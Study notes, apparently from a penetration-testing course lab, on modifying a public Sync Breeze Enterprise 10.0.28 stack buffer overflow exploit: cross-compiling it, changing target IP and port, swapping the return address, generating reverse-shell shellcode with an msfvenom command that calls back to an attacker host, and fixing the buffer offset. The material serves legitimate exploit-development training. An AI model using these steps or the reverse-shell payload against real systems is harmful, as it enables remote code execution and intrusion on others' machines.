

- Can be complex and difficult to modify  
	- Not only replace file paths, IPs, ports, URLs, possibly shellcode.  
		- If any of these mods alter the offset, we must adjust the buffer length to ensure we overwrite the RET properly.  
		- Some shellcode is required for exploit to work & needs to be reverse engineered to determine its safety.  
	- Also likely need to clone target env in a VM and use debugger to verify/ mod return address & offsets.  
  
  
General flow of standard stack overflow (in apps running w/o mitigations like DEP, ASLR, etc):  
1. Create large enough buffer to trigger the overflow.  
2. Take control of EIP by overwriting the RET addr by padding w/ appropriate offset.  
3. Include chosen payload w/in the buffer prepended by NOP sled.  
4. Choose correct RET addr (like JMP ESP) to redirect execution flow into our payload.  
  
  
Key diff:  
- Scripting langs are executed through an interpreter & not compiled to create a stand-alone exe.  
- Because they require an interpreter, this means we can't run a _Python_ script in an env where _Python_ isn't installed  
	- This can limit us in the field, esp if we need a stand-alone exploit (like local priv esc) that must run in an env that doesn't have Python pre-installed.  
- In a scripting lang like _Python_, concatenating a string is easy, but not allowed in a lang like C  
  
  
  
Practice - Exploit SyncBreeze Enterprise on Win client  
```bash
┌──(kali㉿kali)-[~/temp]  
└─$ searchsploit "sync breeze enterprise 10.0.28"  
--------------------------------------------------------------------------- ---------------------------------  
 Exploit Title                                                             |  Path  
--------------------------------------------------------------------------- ---------------------------------  
Sync Breeze Enterprise 10.0.28 - Denial of-Service (PoC)                   | windows/dos/43200.py  
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow                    | windows/remote/42928.py  
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC)              | windows/dos/42341.c  
--------------------------------------------------------------------------- ---------------------------------  
Shellcodes: No Results  
  
  
┌──(kali㉿kali)-[~/temp]  
└─$ searchsploit -m 42341
```


After mirroring the exploit to home dir, inspect code:  
- find a header indicating code is meant to be compiled on Windows  
```bash
#include <winsock2.h>  
#include <windows.h>
```
	- Meaning it'll need to be cross-compiled on Kali  




### Cross-Compiling

Recommenced to use native compilers for the specific operating system targeted by the code.  
As there are situations where we only have access to a single attack env, but need to leverage an exploit coded for a diff platform, we can use a cross-compiler.  
  
```bash
sudo apt install mingw-w64
```

[mingw-w64](mingw-w64.md) also works on Windows  
  
Compile the code into a Windows PE file:  
```bash
┌──(kali㉿kali)-[~/temp]  
└─$ i686-w64-mingw32-gcc syncBrz_EDB-42341.c -o syncBrz_exploit.exe  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0xa5): undefined reference to `_imp__WSAGetLastError@0'  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0xe9): undefined reference to `_imp__socket@12'  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0xfc): undefined reference to `_imp__WSAGetLastError@0'  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x126): undefined reference to `_imp__inet_addr@4'  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x146): undefined reference to `_imp__htons@4'  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x16f): undefined reference to `_imp__connect@12'  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x1b8): undefined reference to `_imp__send@16'  
/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x1eb): undefined reference to `_imp__closesocket@4'  
collect2: error: ld returned 1 exit status  

```


Googling for "WSAStartup" reveals the function is found in _winsock.h_  
Googling for exact error message gives answer in Stack Overflow: [https://stackoverflow.com/questions/34384803/c-undefined-reference-to-wsastartup8](https://stackoverflow.com/questions/34384803/c-undefined-reference-to-wsastartup8)  
	(These errors occur when the linker cannot find the winsock library)  
  
  
So, incoorporating suggestion works:  
```bash
i686-w64-mingw32-gcc syncBrz_EDB-42341.c -o syncBrz_exploit.exe -lws2_32
```



### Changing Socket Info

Considering, this is a remotely-accessible vuln, we need to establish a connection. So we'll have to adjust the hardcoded IP and ports w/in the code _Lines 36 & 38_  
```bash
printf("[>] Socket created.\n");
server.sin_addr.s_addr = inet_addr("192.168.222.10");
server.sin_family = AF_INET;
server.sin_port = htons(80);
```

 
Will need to either **nc** it over to the Win machine to run OR run w/ **wine**  
  
(IF running wine & there's an error: wine: could not load kernel32.dll, status c0000135 follow these instructions: [https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811)](https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811))    



### Changing the Return Address:  
  
_Line 74_ - Has the RET address set for an address w/in _msvbvm60.dll_, which we know isn't utilized by SyncBreeze.  
 
  
From earlier work w/ exploiting the app, we can replace the RET address w/ the one we used before: “\x83\x0c\x09\x10”; 0x10090c83 which points to the JMP ESP register  
  
If we haven't worked w/ the app previously, we can recreate the target env locally & use a debugger to determine the addr.  
If this isn't possible, we could use info from other publicly available exploits to get a reliable RET which will match our target env.  
- This isn't the most reliable  
Alternatively, we can obtain a RET directly from the target machine.  
- Need access as an unprivileged user,  
	- Run an exploit to elevate priv,  
	- Copy the DLLs that we're interest in onto our attack machine  
	- Use disassemblers or [msfpescan](msfpescan.md) to obtain a reliable RET



### Changing the Payload:

Taking a look at the payload given w/ in the exploit, it's difficult to determine its purpose. Only thing we _can_ see is the nop sled.  
So, it's crucial we replace the given shellcode w/ our own (keeping the nops)  
  
Use [msfvenom](msfvenom.md) and the previous list of [bad characters](11%20-%20BO%20Win.md#bad%20chars) to generate shellcode:  
  
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.222 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```


As we've changed several things (& as discovered when running the exploit), our overflow does not quite fully cover EIP. So we need to modify it.  



### Changing the Overflow Buffer:

Looking at where the first part of our large padding buffer of A's are created, we see it starts w/ a call to _malloc_ w/ a size of 780:  
_Lines 70-71_  
```c
int initial_buffer_size = 780;  
char *padding = malloc(initial_buffer_size);
```

  
  
As 780 is the same offset we discovered during our [Win BO](11%20-%20BO%20Win.md#eip), that should be fine.  
  
However, looking at the rest of the code surrounding the buffer, we see that the final buffer is constructed as a string.  
C lang makes use of null-terminated strings. Meaning functions such as _strcpy_ and _strcat_ determine the end and size of a string by searching for the first NULL in the char array.  
  
Meaning, we end up concatenating (_strcat_) a string of 779 A's rather thanb the 780.  
_Lines 73, 110-118_  
```c
memset(padding + initial_buffer_size -1, 0x00, 1);  
...  
...  
char *buffer = malloc(buffer_length);  
memset(buffer, 0x00, buffer_length);  
strcpy(buffer, request_one);  
strcat(buffer, content_length_string);  
strcat(buffer, request_two);  
strcat(buffer, padding);  
strcat(buffer, retn);  
strcat(buffer, shellcode);  
strcat(buffer, request_three);
```


In order to fix this, we only need to increase the requested memory size defined by the _initial_buffer_size_ var by 1:  
_Line 70_  
```c
int initial_buffer_size = 781;
```